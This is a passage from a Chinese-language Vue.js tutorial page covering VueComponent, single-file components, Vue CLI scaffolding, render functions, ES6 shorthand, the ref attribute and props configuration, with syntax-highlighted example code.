                <span class="na">address</span><span class="p">:</span><span class="dl">'</span><span class="s1">北京</span><span class="dl">'</span>
            <span class="p">}</span>
        <span class="p">},</span>
        <span class="c1">// 注册组件（局部）</span>
        <span class="na">components</span><span class="p">:{</span>
            <span class="nx">student</span>
        <span class="p">}</span>
    <span class="p">})</span>

    <span class="c1">//定义hello组件</span>
    <span class="kd">const</span> <span class="nx">hello</span> <span class="o">=</span> <span class="nx">Vue</span><span class="p">.</span><span class="nx">extend</span><span class="p">({</span>
        <span class="na">template</span><span class="p">:</span><span class="s2">`&lt;h1&gt;&lt;/h1&gt;`</span><span class="p">,</span>
        <span class="nx">data</span><span class="p">(){</span>
            <span class="k">return</span> <span class="p">{</span>
                <span class="na">msg</span><span class="p">:</span><span class="dl">'</span><span class="s1">欢迎来到尚硅谷学习！</span><span class="dl">'</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">})</span>

    <span class="c1">//定义app组件</span>
    <span class="kd">const</span> <span class="nx">app</span> <span class="o">=</span> <span class="nx">Vue</span><span class="p">.</span><span class="nx">extend</span><span class="p">({</span>
        <span class="na">template</span><span class="p">:</span><span class="s2">`
				&lt;div&gt;	
					&lt;hello&gt;&lt;/hello&gt;
					&lt;school&gt;&lt;/school&gt;
    &lt;/div&gt;
			`</span><span class="p">,</span>
        <span class="na">components</span><span class="p">:{</span>
            <span class="nx">school</span><span class="p">,</span>
            <span class="nx">hello</span>
        <span class="p">}</span>
    <span class="p">})</span>

    <span class="c1">//创建vm</span>
    <span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
        <span class="na">template</span><span class="p">:</span><span class="dl">'</span><span class="s1">&lt;app&gt;&lt;/app&gt;</span><span class="dl">'</span><span class="p">,</span>
        <span class="na">el</span><span class="p">:</span><span class="dl">'</span><span class="s1">#root</span><span class="dl">'</span><span class="p">,</span>
        <span class="c1">//注册组件（局部）</span>
        <span class="na">components</span><span class="p">:{</span><span class="nx">app</span><span class="p">}</span>
    <span class="p">})</span>
<span class="nt">&lt;/</span><span class="k">script</span><span class="nt">&gt;</span>
</code></pre></div></div><h3 id="vuecomponent">VueComponent</h3><ul><li>school组件本质是一个名为VueComponent的构造函数，且不是程序员定义的，是Vue.extend生成的。</li><li>我们只需要写<school></school>或<school></school>，Vue解析时会帮我们创建school组件的实例对象，即Vue帮我们执行的：new VueComponent(options)。</li><li>特别注意：每次调用Vue.extend，返回的都是一个全新的VueComponent！！！！(这个VueComponent可不是实例对象)</li><li>关于this指向：<ul><li>组件配置中：data函数、methods中的函数、watch中的函数、computed中的函数 它们的this均是【VueComponent实例对象】。</li><li>new Vue(options)配置中：data函数、methods中的函数、watch中的函数、computed中的函数 它们的this均是【Vue实例对象】。</li></ul></li><li>VueComponent的实例对象，以后简称vc（也可称之为：组件实例对象）。Vue的实例对象，以后简称vm。</li></ul><p>Vue 在哪管理 VueComponent</p><p><img src="C:\Users\28318\AppData\Roaming\Typora\typora-user-images\image-20220402125551334.png" alt="image-20220402125551334" /></p><h3 id="一个重要的内置关系">一个重要的内置关系</h3><ul><li>一个重要的内置关系：VueComponent.prototype.<strong>proto</strong> === Vue.prototype</li><li>为什么要有这个关系：让组件实例对象（vc）可以访问到 Vue原型上的属性、方法。</li></ul><p><img src="C:\Users\28318\Desktop\vue\vue_basic\18_非单文件组件\vuecomponent.png" alt="vuecomponent" /></p><h2 id="121-单文件组件">1.21 单文件组件</h2><p>单文件组件就是将一个组件的代码写在 .vue 这种格式的文件中，webpack 会将 .vue 文件解析成 html,css,js这些形式。</p><p>来做个单文件组件的案例：</p><p><strong>School.vue</strong></p><div class="language-vue highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;</span><span class="k">template</span><span class="nt">&gt;</span>
	<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"demo"</span><span class="nt">&gt;</span>
		<span class="nt">&lt;h2&gt;</span>学校名称：<span class="nt">&lt;/h2&gt;</span>
		<span class="nt">&lt;h2&gt;</span>学校地址：<span class="nt">&lt;/h2&gt;</span>
		<span class="nt">&lt;button</span> <span class="err">@</span><span class="na">click=</span><span class="s">"showName"</span><span class="nt">&gt;</span>点我提示学校名<span class="nt">&lt;/button&gt;</span>	
	<span class="nt">&lt;/div&gt;</span>
<span class="nt">&lt;/</span><span class="k">template</span><span class="nt">&gt;</span>

<span class="nt">&lt;</span><span class="k">script</span><span class="nt">&gt;</span>
	 <span class="k">export</span> <span class="k">default</span> <span class="p">{</span>
		<span class="na">name</span><span class="p">:</span><span class="dl">'</span><span class="s1">School</span><span class="dl">'</span><span class="p">,</span>
		<span class="nx">data</span><span class="p">(){</span>
			<span class="k">return</span> <span class="p">{</span>
				<span class="na">name</span><span class="p">:</span><span class="dl">'</span><span class="s1">尚硅谷</span><span class="dl">'</span><span class="p">,</span>
				<span class="na">address</span><span class="p">:</span><span class="dl">'</span><span class="s1">北京昌平</span><span class="dl">'</span>
			<span class="p">}</span>
		<span class="p">},</span>
		<span class="na">methods</span><span class="p">:</span> <span class="p">{</span>
			<span class="nx">showName</span><span class="p">(){</span>
				<span class="nx">alert</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">name</span><span class="p">)</span>
			<span class="p">}</span>
		<span class="p">},</span>
	<span class="p">}</span>
<span class="nt">&lt;/</span><span class="k">script</span><span class="nt">&gt;</span>

<span class="nt">&lt;</span><span class="k">style</span><span class="nt">&gt;</span>
	<span class="nc">.demo</span><span class="p">{</span>
		<span class="nl">background-color</span><span class="p">:</span> <span class="no">orange</span><span class="p">;</span>
	<span class="p">}</span>
<span class="nt">&lt;/</span><span class="k">style</span><span class="nt">&gt;</span>
</code></pre></div></div><p><strong>Student.vue</strong></p><div class="language-vue highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;</span><span class="k">template</span><span class="nt">&gt;</span>
	<span class="nt">&lt;div&gt;</span>
		<span class="nt">&lt;h2&gt;</span>学生姓名：<span class="nt">&lt;/h2&gt;</span>
		<span class="nt">&lt;h2&gt;</span>学生年龄：<span class="nt">&lt;/h2&gt;</span>
	<span class="nt">&lt;/div&gt;</span>
<span class="nt">&lt;/</span><span class="k">template</span><span class="nt">&gt;</span>

<span class="nt">&lt;</span><span class="k">script</span><span class="nt">&gt;</span>
	 <span class="k">export</span> <span class="k">default</span> <span class="p">{</span>
		<span class="na">name</span><span class="p">:</span><span class="dl">'</span><span class="s1">Student</span><span class="dl">'</span><span class="p">,</span>
		<span class="nx">data</span><span class="p">(){</span>
			<span class="k">return</span> <span class="p">{</span>
				<span class="na">name</span><span class="p">:</span><span class="dl">'</span><span class="s1">张三</span><span class="dl">'</span><span class="p">,</span>
				<span class="na">age</span><span class="p">:</span><span class="mi">18</span>
			<span class="p">}</span>
		<span class="p">}</span>
	<span class="p">}</span>
<span class="nt">&lt;/</span><span class="k">script</span><span class="nt">&gt;</span>
</code></pre></div></div><p><strong>App.vue</strong></p><p>用来汇总所有的组件(大总管)</p><div class="language-vue highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;</span><span class="k">template</span><span class="nt">&gt;</span>
	<span class="nt">&lt;div&gt;</span>
		<span class="nt">&lt;School&gt;&lt;/School&gt;</span>
		<span class="nt">&lt;Student&gt;&lt;/Student&gt;</span>
	<span class="nt">&lt;/div&gt;</span>
<span class="nt">&lt;/</span><span class="k">template</span><span class="nt">&gt;</span>

<span class="nt">&lt;</span><span class="k">script</span><span class="nt">&gt;</span>
	<span class="c1">//引入组件</span>
	<span class="k">import</span> <span class="nx">School</span> <span class="k">from</span> <span class="dl">'</span><span class="s1">./School.vue</span><span class="dl">'</span>
	<span class="k">import</span> <span class="nx">Student</span> <span class="k">from</span> <span class="dl">'</span><span class="s1">./Student.vue</span><span class="dl">'</span>

	<span class="k">export</span> <span class="k">default</span> <span class="p">{</span>
		<span class="na">name</span><span class="p">:</span><span class="dl">'</span><span class="s1">App</span><span class="dl">'</span><span class="p">,</span>
		<span class="na">components</span><span class="p">:{</span>
			<span class="nx">School</span><span class="p">,</span>
			<span class="nx">Student</span>
		<span class="p">}</span>
	<span class="p">}</span>
<span class="nt">&lt;/</span><span class="k">script</span><span class="nt">&gt;</span>
</code></pre></div></div><p><strong>main.js</strong></p><p>在这个文件里面创建 vue 实例</p><div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">import</span> <span class="nx">App</span> <span class="k">from</span> <span class="dl">'</span><span class="s1">./App.vue</span><span class="dl">'</span>

<span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
	<span class="na">el</span><span class="p">:</span><span class="dl">'</span><span class="s1">#root</span><span class="dl">'</span><span class="p">,</span>
	<span class="na">template</span><span class="p">:</span><span class="s2">`&lt;App&gt;&lt;/App&gt;`</span><span class="p">,</span>
	<span class="na">components</span><span class="p">:{</span><span class="nx">App</span><span class="p">},</span>
<span class="p">})</span>
</code></pre></div></div><p><strong>index.html</strong></p><p>在这写 vue 要绑定的容器</p><div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="nt">&lt;html&gt;</span>
	<span class="nt">&lt;head&gt;</span>
		<span class="nt">&lt;meta</span> <span class="na">charset=</span><span class="s">"UTF-8"</span> <span class="nt">/&gt;</span>
		<span class="nt">&lt;title&gt;</span>练习一下单文件组件的语法<span class="nt">&lt;/title&gt;</span>
	<span class="nt">&lt;/head&gt;</span>
	<span class="nt">&lt;body&gt;</span>
		<span class="c">&lt;!-- 准备一个容器 --&gt;</span>
		<span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"root"</span><span class="nt">&gt;&lt;/div&gt;</span>
        <span class="nt">&lt;script </span><span class="na">type=</span><span class="s">"text/javascript"</span> <span class="na">src=</span><span class="s">"../js/vue.js"</span><span class="nt">&gt;&lt;/script&gt;</span>
		<span class="nt">&lt;script </span><span class="na">type=</span><span class="s">"text/javascript"</span> <span class="na">src=</span><span class="s">"./main.js"</span><span class="nt">&gt;&lt;/script&gt;</span>
	<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</code></pre></div></div><h1 id="2-vue脚手架自定义事件插槽等复杂内容">2. vue脚手架，自定义事件，插槽等复杂内容</h1><h2 id="21-脚手架">2.1 脚手架</h2><blockquote><p>使用前置：</p><p>第一步(没有安装过的执行)：全局安装 @vue/cli</p><p>npm install -g @vue/cli</p><p>第二步：切换到要创建项目的目录，然后使用命令创建项目</p><p>vue create xxxxx</p><p>第三步：启动项目</p><p>npm run serve</p></blockquote><h3 id="脚手架文件结构">脚手架文件结构</h3><div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>├── node_modules 
├── public
│   ├── favicon.ico: 页签图标
│   └── index.html: 主页面
├── src
│   ├── assets: 存放静态资源
│   │   └── logo.png
│   │── component: 存放组件
│   │   └── HelloWorld.vue
│   │── App.vue: 汇总所有组件
│   │── main.js: 入口文件
├── .gitignore: git版本管制忽略的配置
├── babel.config.js: babel的配置文件
├── package.json: 应用包配置文件 
├── README.md: 应用描述文件
├── package-lock.json：包版本控制文件
</code></pre></div></div><h3 id="脚手架demo">脚手架demo</h3><p>components:</p><p>就直接把单文件组件的 School.vue 和 Student.vue 两个文件直接拿来用，不需要修改。</p><p>App.vue:</p><p>引入这两个组件，注册一下这两个组件，再使用。</p><div class="language-vue highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;</span><span class="k">template</span><span class="nt">&gt;</span>
  <span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"app"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;img</span> <span class="na">alt=</span><span class="s">"Vue logo"</span> <span class="na">src=</span><span class="s">"./assets/logo.png"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;Student&gt;&lt;/Student&gt;</span>
    <span class="nt">&lt;School&gt;&lt;/School&gt;</span>
  <span class="nt">&lt;/div&gt;</span>
<span class="nt">&lt;/</span><span class="k">template</span><span class="nt">&gt;</span>

<span class="nt">&lt;</span><span class="k">script</span><span class="nt">&gt;</span>
<span class="k">import</span> <span class="nx">School</span> <span class="k">from</span> <span class="dl">'</span><span class="s1">./components/School.vue</span><span class="dl">'</span>
<span class="k">import</span> <span class="nx">Student</span> <span class="k">from</span> <span class="dl">'</span><span class="s1">./components/Student.vue</span><span class="dl">'</span>

<span class="k">export</span> <span class="k">default</span> <span class="p">{</span>
  <span class="na">name</span><span class="p">:</span> <span class="dl">'</span><span class="s1">App</span><span class="dl">'</span><span class="p">,</span>
  <span class="na">components</span><span class="p">:</span> <span class="p">{</span>
    <span class="nx">School</span><span class="p">,</span>
    <span class="nx">Student</span>
  <span class="p">}</span>
<span class="p">}</span>
<span class="nt">&lt;/</span><span class="k">script</span><span class="nt">&gt;</span>

<span class="nt">&lt;</span><span class="k">style</span><span class="nt">&gt;</span>
<span class="nf">#app</span> <span class="p">{</span>
  <span class="nl">font-family</span><span class="p">:</span> <span class="n">Avenir</span><span class="p">,</span> <span class="n">Helvetica</span><span class="p">,</span> <span class="n">Arial</span><span class="p">,</span> <span class="nb">sans-serif</span><span class="p">;</span>
  <span class="nl">-webkit-font-smoothing</span><span class="p">:</span> <span class="n">antialiased</span><span class="p">;</span>
  <span class="nl">-moz-osx-font-smoothing</span><span class="p">:</span> <span class="n">grayscale</span><span class="p">;</span>
  <span class="nl">text-align</span><span class="p">:</span> <span class="nb">center</span><span class="p">;</span>
  <span class="nl">color</span><span class="p">:</span> <span class="m">#2c3e50</span><span class="p">;</span>
  <span class="nl">margin-top</span><span class="p">:</span> <span class="m">60px</span><span class="p">;</span>
<span class="p">}</span>
<span class="nt">&lt;/</span><span class="k">style</span><span class="nt">&gt;</span>
</code></pre></div></div><p>main.js:</p><p>入口文件</p><div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">import</span> <span class="nx">Vue</span> <span class="k">from</span> <span class="dl">'</span><span class="s1">vue</span><span class="dl">'</span>
<span class="k">import</span> <span class="nx">App</span> <span class="k">from</span> <span class="dl">'</span><span class="s1">./App.vue</span><span class="dl">'</span>

<span class="nx">Vue</span><span class="p">.</span><span class="nx">config</span><span class="p">.</span><span class="nx">productionTip</span> <span class="o">=</span> <span class="kc">false</span>

<span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
  <span class="na">render</span><span class="p">:</span> <span class="nx">h</span> <span class="o">=&gt;</span> <span class="nx">h</span><span class="p">(</span><span class="nx">App</span><span class="p">),</span>
<span class="p">}).</span><span class="nx">$mount</span><span class="p">(</span><span class="dl">'</span><span class="s1">#app</span><span class="dl">'</span><span class="p">)</span>
</code></pre></div></div><p>接下来就要详细讲解 main.js 中的 render 函数</p><h3 id="render函数">render函数</h3><blockquote><p>插入一个小知识：</p></blockquote><p>使用 import 导入第三方库的时候不需要 加 ‘./’</p><p>导入我们自己写的：</p><div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">import</span> <span class="nx">App</span> <span class="k">from</span> <span class="dl">'</span><span class="s1">./App.vue</span><span class="dl">'</span>
</code></pre></div></div><p>导入第三方的</p><div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">import</span> <span class="nx">Vue</span> <span class="k">from</span> <span class="dl">'</span><span class="s1">vue</span><span class="dl">'</span>
</code></pre></div></div><p>不需要在 from ‘vue’ 加 <code class="language-plaintext highlighter-rouge">'./'</code> 的原因是第三方库 node_modules 人家帮我们配置好了。</p><p>我们通过 import 导入第三方库，在第三方库的 package.json 文件中确定了我们引入的是哪个文件</p><p><img src="C:\Users\28318\AppData\Roaming\Typora\typora-user-images\image-20220402174006177.png" alt="image-20220402174006177" /></p><p>通过 module 确定了我们要引入的文件。</p><blockquote><p>回到 render 函数</p></blockquote><p>之前的写法是这样：</p><div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">import</span> <span class="nx">App</span> <span class="k">from</span> <span class="dl">'</span><span class="s1">./App.vue</span><span class="dl">'</span>

<span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
	<span class="na">el</span><span class="p">:</span><span class="dl">'</span><span class="s1">#root</span><span class="dl">'</span><span class="p">,</span>
	<span class="na">template</span><span class="p">:</span><span class="s2">`&lt;App&gt;&lt;/App&gt;`</span><span class="p">,</span>
	<span class="na">components</span><span class="p">:{</span><span class="nx">App</span><span class="p">},</span>
<span class="p">})</span>
</code></pre></div></div><p>如果这样子写，运行的话会引发如下的报错</p><p><img src="C:\Users\28318\AppData\Roaming\Typora\typora-user-images\image-20220402172119887.png" alt="image-20220402172119887" /></p><p>报错的意思是，是在使用运行版本的 vue ，没有模板解析器。</p><p>从上面的小知识可以知道，我们引入的 vue 不是完整版的，是残缺的（为了减小vue的大小）。所以残缺的vue.js 只有通过 render 函数才能把项目给跑起来。</p><p>来解析一下render</p><div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// render最原始写的方式</span>
<span class="c1">// render是个函数，还能接收到参数a</span>
<span class="c1">// 这个 createElement 很关键，是个回调函数</span>
<span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
  <span class="nx">render</span><span class="p">(</span><span class="nx">createElement</span><span class="p">)</span> <span class="p">{</span>
      <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="k">typeof</span> <span class="nx">createElement</span><span class="p">);</span>
      <span class="c1">// 这个 createElement 回调函数能创建元素</span>
      <span class="c1">// 因为残缺的vue 不能解析 template，所以render就来帮忙解决这个问题</span>
      <span class="c1">// createElement 能创建具体的元素</span>
      <span class="k">return</span> <span class="nx">createElement</span><span class="p">(</span><span class="dl">'</span><span class="s1">h1</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">hello</span><span class="dl">'</span><span class="p">)</span>
  <span class="p">}</span>
<span class="p">}).</span><span class="nx">$mount</span><span class="p">(</span><span class="dl">'</span><span class="s1">#app</span><span class="dl">'</span><span class="p">)</span>

</code></pre></div></div><p><img src="C:\Users\28318\AppData\Roaming\Typora\typora-user-images\image-20220402175931186.png" alt="image-20220402175931186" /></p><p>因为 render 函数内并没有用到 this，所以可以简写成箭头函数。</p><div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
  <span class="c1">// render: h =&gt; h(App),</span>
  <span class="na">render</span><span class="p">:</span> <span class="p">(</span><span class="nx">createElement</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
    <span class="k">return</span> <span class="nx">createElement</span><span class="p">(</span><span class="nx">App</span><span class="p">)</span>
  <span class="p">}</span>
<span class="p">}).</span><span class="nx">$mount</span><span class="p">(</span><span class="dl">'</span><span class="s1">#app</span><span class="dl">'</span><span class="p">)</span>
</code></pre></div></div><p>再简写：</p><div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
  <span class="c1">// render: h =&gt; h(App),</span>
  <span class="na">render</span><span class="p">:</span> <span class="nx">createElement</span> <span class="o">=&gt;</span> <span class="nx">createElement</span><span class="p">(</span><span class="nx">App</span><span class="p">)</span>
<span class="p">}).</span><span class="nx">$mount</span><span class="p">(</span><span class="dl">'</span><span class="s1">#app</span><span class="dl">'</span><span class="p">)</span>
</code></pre></div></div><p>最后把 createElement 换成 h 就完事了。</p><p>算啦算啦，把简写都整理一遍吧，js里的简写确实多哇。</p><p>对象内写方法最原始的：</p><div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">let</span> <span class="nx">obj</span> <span class="o">=</span> <span class="p">{</span>
    <span class="na">name</span><span class="p">:</span> <span class="dl">'</span><span class="s1">aaa</span><span class="dl">'</span><span class="p">,</span>
    <span class="na">work</span><span class="p">:</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">salary</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="dl">'</span><span class="s1">工资</span><span class="dl">'</span> <span class="o">+</span> <span class="nx">salary</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div><p>ES6 简化版：</p><div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">let</span> <span class="nx">obj</span> <span class="o">=</span> <span class="p">{</span>
    <span class="na">name</span><span class="p">:</span> <span class="dl">'</span><span class="s1">aaa</span><span class="dl">'</span><span class="p">,</span>
    <span class="nx">work</span><span class="p">(</span><span class="nx">salary</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="dl">'</span><span class="s1">工资</span><span class="dl">'</span> <span class="o">+</span> <span class="nx">salary</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div><p>箭头函数简化版:</p><div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">let</span> <span class="nx">obj</span> <span class="o">=</span> <span class="p">{</span>
    <span class="na">name</span><span class="p">:</span> <span class="dl">'</span><span class="s1">aaa</span><span class="dl">'</span><span class="p">,</span>
    <span class="na">work</span><span class="p">:</span> <span class="p">(</span><span class="nx">salary</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
        <span class="k">return</span> <span class="dl">'</span><span class="s1">工资</span><span class="dl">'</span> <span class="o">+</span> <span class="nx">salary</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div><p>箭头函数再简化（最终版）：</p><div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// 只有一个参数就可以把圆括号去了，函数体内部只有一个 return 就可以把大括号去掉，return去掉</span>
<span class="kd">let</span> <span class="nx">obj</span> <span class="o">=</span> <span class="p">{</span>
    <span class="na">name</span><span class="p">:</span> <span class="dl">'</span><span class="s1">aaa</span><span class="dl">'</span><span class="p">,</span>
    <span class="na">work</span><span class="p">:</span> <span class="nx">salary</span> <span class="o">=&gt;</span> <span class="dl">'</span><span class="s1">工资</span><span class="dl">'</span> <span class="o">+</span> <span class="nx">salary</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div><p>这样就可以理解 render 函数的简写方式了。</p><p>来个不同版本 vue 的区别</p><ul><li>vue.js与vue.runtime.xxx.js的区别：<ul><li>vue.js是完整版的Vue，包含：核心功能+模板解析器。</li><li>vue.runtime.xxx.js是运行版的Vue，只包含：核心功能；没有模板解析器。</li></ul></li><li>因为vue.runtime.xxx.js没有模板解析器，所以不能使用template配置项，需要使用render函数接收到的createElement函数去指定具体内容。</li></ul><h3 id="修改脚手架的默认配置">修改脚手架的默认配置</h3><ul><li>使用vue inspect &gt; output.js可以查看到Vue脚手架的默认配置。</li><li>使用vue.config.js可以对脚手架进行个性化定制，详情见：https://cli.vuejs.org/zh</li></ul><h3 id="脚手架中的indexhtml">脚手架中的index.html</h3><div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="nt">&lt;html</span> <span class="na">lang=</span><span class="s">""</span><span class="nt">&gt;</span>
  <span class="nt">&lt;head&gt;</span>
    <span class="nt">&lt;meta</span> <span class="na">charset=</span><span class="s">"utf-8"</span><span class="nt">&gt;</span>
	<span class="c">&lt;!-- 针对IE浏览器的一个特殊配置，含义是让IE浏览器以最高的渲染级别渲染页面 --&gt;</span>
    <span class="nt">&lt;meta</span> <span class="na">http-equiv=</span><span class="s">"X-UA-Compatible"</span> <span class="na">content=</span><span class="s">"IE=edge"</span><span class="nt">&gt;</span>
	<span class="c">&lt;!-- 开启移动端的理想视口 --&gt;</span>
    <span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">"viewport"</span> <span class="na">content=</span><span class="s">"width=device-width,initial-scale=1.0"</span><span class="nt">&gt;</span>
	<span class="c">&lt;!-- 配置页签图标 --&gt;</span>
    <span class="nt">&lt;link</span> <span class="na">rel=</span><span class="s">"icon"</span> <span class="na">href=</span><span class="s">"&lt;%= BASE_URL %&gt;favicon.ico"</span><span class="nt">&gt;</span>
	<span class="c">&lt;!-- 引入第三方样式 --&gt;</span>
	<span class="nt">&lt;link</span> <span class="na">rel=</span><span class="s">"stylesheet"</span> <span class="na">href=</span><span class="s">"&lt;%= BASE_URL %&gt;css/bootstrap.css"</span><span class="nt">&gt;</span>
	<span class="c">&lt;!-- 配置网页标题 --&gt;</span>
    <span class="nt">&lt;title&gt;</span>硅谷系统<span class="nt">&lt;/title&gt;</span>
  <span class="nt">&lt;/head&gt;</span>
  <span class="nt">&lt;body&gt;</span>
		<span class="c">&lt;!-- 当浏览器不支持js时noscript中的元素就会被渲染 --&gt;</span>
    <span class="nt">&lt;noscript&gt;</span>
      <span class="nt">&lt;strong&gt;</span>We're sorry but <span class="nt">&lt;</span><span class="err">%=</span> <span class="na">htmlWebpackPlugin.options.title</span> <span class="err">%</span><span class="nt">&gt;</span> doesn't work properly without JavaScript enabled. Please enable it to continue.<span class="nt">&lt;/strong&gt;</span>
    <span class="nt">&lt;/noscript&gt;</span>
		<span class="c">&lt;!-- 容器 --&gt;</span>
    <span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"app"</span><span class="nt">&gt;&lt;/div&gt;</span>
    <span class="c">&lt;!-- built files will be auto injected --&gt;</span>
  <span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>

</code></pre></div></div><h2 id="22-vue-零碎的一些知识">2.2 vue 零碎的一些知识</h2><h3 id="ref属性">ref属性</h3><ul><li>被用来给元素或子组件注册引用信息（id的替代者）</li><li>应用在html标签上获取的是真实DOM元素，应用在组件标签上是组件实例对象（vc）</li><li>使用方式：<ul><li>打标识：<code class="language-plaintext highlighter-rouge">&lt;h1 ref="xxx"&gt;.....&lt;/h1&gt;</code> 或 <code class="language-plaintext highlighter-rouge">&lt;School ref="xxx"&gt;&lt;/School&gt;</code></li><li>获取：<code class="language-plaintext highlighter-rouge">this.$refs.xxx</code></li></ul></li></ul><blockquote><p>具体案例</p></blockquote><div class="language-vue highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;</span><span class="k">template</span><span class="nt">&gt;</span>
	<span class="nt">&lt;div&gt;</span>
		<span class="nt">&lt;h1</span> <span class="na">v-text=</span><span class="s">"msg"</span> <span class="na">ref=</span><span class="s">"title"</span><span class="nt">&gt;&lt;/h1&gt;</span>
		<span class="nt">&lt;button</span> <span class="na">ref=</span><span class="s">"btn"</span> <span class="err">@</span><span class="na">click=</span><span class="s">"showDOM"</span><span class="nt">&gt;</span>点我输出上方的DOM元素<span class="nt">&lt;/button&gt;</span>
		<span class="nt">&lt;School</span> <span class="na">ref=</span><span class="s">"sch"</span><span class="nt">/&gt;</span>
	<span class="nt">&lt;/div&gt;</span>
<span class="nt">&lt;/</span><span class="k">template</span><span class="nt">&gt;</span>

<span class="nt">&lt;</span><span class="k">script</span><span class="nt">&gt;</span>
	<span class="c1">//引入School组件</span>
	<span class="k">import</span> <span class="nx">School</span> <span class="k">from</span> <span class="dl">'</span><span class="s1">./components/School</span><span class="dl">'</span>

	<span class="k">export</span> <span class="k">default</span> <span class="p">{</span>
		<span class="na">name</span><span class="p">:</span><span class="dl">'</span><span class="s1">App</span><span class="dl">'</span><span class="p">,</span>
		<span class="na">components</span><span class="p">:{</span><span class="nx">School</span><span class="p">},</span>
		<span class="nx">data</span><span class="p">()</span> <span class="p">{</span>
			<span class="k">return</span> <span class="p">{</span>
				<span class="na">msg</span><span class="p">:</span><span class="dl">'</span><span class="s1">欢迎学习Vue！</span><span class="dl">'</span>
			<span class="p">}</span>
		<span class="p">},</span>
		<span class="na">methods</span><span class="p">:</span> <span class="p">{</span>
			<span class="nx">showDOM</span><span class="p">(){</span>
				<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">$refs</span><span class="p">.</span><span class="nx">title</span><span class="p">)</span> <span class="c1">//真实DOM元素</span>
				<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">$refs</span><span class="p">.</span><span class="nx">btn</span><span class="p">)</span> <span class="c1">//真实DOM元素</span>
				<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">$refs</span><span class="p">.</span><span class="nx">sch</span><span class="p">)</span> <span class="c1">//School组件的实例对象（vc）</span>
			<span class="p">}</span>
		<span class="p">},</span>
	<span class="p">}</span>
<span class="nt">&lt;/</span><span class="k">script</span><span class="nt">&gt;</span>

</code></pre></div></div><h3 id="props配置项">props配置项</h3><ol><li><p>功能：让组件接收外部传过来的数据</p></li><li><p>传递数据：<code class="language-plaintext highlighter-rouge">&lt;Demo name="xxx"/&gt;</code></p></li><li><p>接收数据：</p><ol><li><p>第一种方式（只接收）：<code class="language-plaintext highlighter-rouge">props:['name']</code></p></li><li><p>第二种方式（限制类型）：<code class="language-plaintext highlighter-rouge">props:{name:String}</code></p></li><li><p>第三种方式（限制类型、限制必要性、指定默认值）：</p><div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">props</span><span class="p">:{</span>
	<span class="nl">name</span><span class="p">:{</span>
        <span class="na">type</span><span class="p">:</span><span class="nb">String</span><span class="p">,</span> <span class="c1">//类型</span>
        <span class="na">required</span><span class="p">:</span><span class="kc">true</span><span class="p">,</span> <span class="c1">//必要性</span>
        <span class="na">default</span><span class="p">:</span><span class="dl">'</span><span class="s1">老王</span><span class="dl">'</span> <span class="c1">//默认值</span>
	<span class="p">}</span>
<span class="p">}</span>
